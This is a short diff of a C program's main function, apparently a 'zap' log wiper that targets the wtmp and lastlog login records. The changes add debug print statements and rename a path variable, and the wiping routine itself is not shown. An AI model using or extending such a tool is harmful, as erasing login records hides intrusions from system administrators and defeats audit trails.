@@ -9,7 +9,6 @@ void usage()
 
 int main(int argc, char *argv[])
 {
-
     flag_A = 0;
     flag_R = 0;
     flag_a = 0;
@@ -60,16 +59,22 @@ int main(int argc, char *argv[])
         }
     }
 
+    printf("flag: %d %d %d\n", flag_a, flag_A, flag_R);
+
     if (!(flag_a || flag_A || flag_R))
     {
         usage();
         exit(EXIT_FAILURE);
     }
 
-    strncpy(path, _PATH_LASTLOG, strlen(_PATH_LASTLOG) + 1);
+    strncpy(lastlog_path, _PATH_LASTLOG, strlen(_PATH_LASTLOG) + 1);
+    printf("lastlog_path: %s\n", lastlog_path);
+
     strncpy(path, _PATH_WTMP, strlen(_PATH_WTMP) + 1);
+    printf("[+] start zap - path: %s\n", path);
     zap2();
     strncpy(path, _PATH_WTMP, strlen(_PATH_WTMP) + 1);
+    printf("[+] start zap - path: %s\n", path);
     zap2();
     printf("Zap!\n");
     exit(EXIT_SUCCESS);
